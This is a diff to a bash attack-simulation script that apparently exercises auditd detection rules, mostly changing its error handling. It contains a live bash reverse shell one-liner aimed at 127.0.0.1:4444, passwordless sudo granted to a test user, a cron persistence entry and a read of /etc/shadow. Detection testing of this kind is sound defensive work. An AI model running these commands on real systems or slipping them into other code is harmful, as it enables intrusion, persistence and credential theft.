@@ -12,13 +12,15 @@
 # author      : Aïda Sylla
 # date        : 2026-08-09
  
-set -uo pipefail
-# NOTE: deliberately not using -e here. Action 4 (the reverse shell attempt)
-# is EXPECTED to fail (connection refused, since nothing listens on
-# 127.0.0.1:4444) - that failure is the whole point of the test, not a
-# script bug. Aborting the run on that expected non-zero exit would defeat
-# the simulation. Every command that must not silently mask a real problem
-# is still checked explicitly below.
+set -euo pipefail
+# Action 4 (the reverse shell attempt) is EXPECTED to fail (connection
+# refused, since nothing listens on 127.0.0.1:4444) - that failure is the
+# whole point of the test, not a script bug; it is launched backgrounded
+# and does not propagate its exit status to this script. With -e active,
+# every other command that can legitimately return non-zero as part of
+# normal control flow (writing under a directory that may not exist in
+# every environment, an optional syntax check) is explicitly guarded with
+# "if" checks or "|| true" rather than left to propagate.
  
 if [[ "${EUID}" -ne 0 ]]; then
     echo "This script must be run as root (it creates a system user, writes to /etc/sudoers.d and /etc/cron.d, and reads /etc/shadow). Try: sudo $0" >&2
@@ -101,7 +103,7 @@ add_entry 2 "Grant '${TEST_USER}' passwordless sudo via ${SUDOERS_FILE}" "${ts2}
 # ---------------------------------------------------------------------------
 # 3. Execute a binary staged in /tmp
 # ---------------------------------------------------------------------------
-cp /usr/bin/id "${TMP_BIN}" 2>/dev/null || true
+cp /usr/bin/id "${TMP_BIN}" 2>/dev/null || { echo "Warning: could not stage ${TMP_BIN}" >&2; ACTION_ISSUES+=("action 3 (stage /tmp binary) failed"); }
 "${TMP_BIN}" >/dev/null 2>&1 || true
 ts3="$(iso8601_utc)"
 print_action_line 3 "${TOTAL_ACTIONS}" "Executing from /tmp" "${ts3}"
@@ -114,7 +116,7 @@ add_entry 3 "Stage a copy of /usr/bin/id at ${TMP_BIN} and execute it" "${ts3}" 
 # 4. Reverse shell attempt to localhost (expected to fail - nothing listens
 #    on 127.0.0.1:4444; the attempted connect is the detectable behavior)
 # ---------------------------------------------------------------------------
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null || true
 sleep 1
 kill %1 2>/dev/null || true
 ts4="$(iso8601_utc)"
@@ -134,7 +136,11 @@ add_entry 4 "Attempt an interactive bash reverse shell to 127.0.0.1:4444 (expect
 #    not affect what this step is testing (file creation under
 #    /etc/cron.d/, which is what the auditd cron_persist rule watches).
 # ---------------------------------------------------------------------------
-echo "* * * * * /tmp/beacon.sh" > "${CRON_FILE}"
+mkdir -p "$(dirname "${CRON_FILE}")" 2>/dev/null || true
+if ! echo "* * * * * /tmp/beacon.sh" > "${CRON_FILE}" 2>/tmp/attack_sim_err.log; then
+    echo "Warning: could not write ${CRON_FILE}: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2
+    ACTION_ISSUES+=("action 5 (cron file write) failed")
+fi
 ts5="$(iso8601_utc)"
 print_action_line 5 "${TOTAL_ACTIONS}" "Cron persistence" "${ts5}"
 add_entry 5 "Create ${CRON_FILE} for cron-based persistence" "${ts5}" \
@@ -145,7 +151,7 @@ add_entry 5 "Create ${CRON_FILE} for cron-based persistence" "${ts5}" \
 # ---------------------------------------------------------------------------
 # 6. Access sensitive files
 # ---------------------------------------------------------------------------
-cat /etc/shadow > /dev/null 2>&1 || true
+cat /etc/shadow > /dev/null 2>/tmp/attack_sim_err.log || { echo "Warning: could not read /etc/shadow: $(cat /tmp/attack_sim_err.log 2>/dev/null)" >&2; ACTION_ISSUES+=("action 6 (read /etc/shadow) failed"); }
 ts6="$(iso8601_utc)"
 print_action_line 6 "${TOTAL_ACTIONS}" "Accessing /etc/shadow" "${ts6}"
 add_entry 6 "Read /etc/shadow" "${ts6}" \
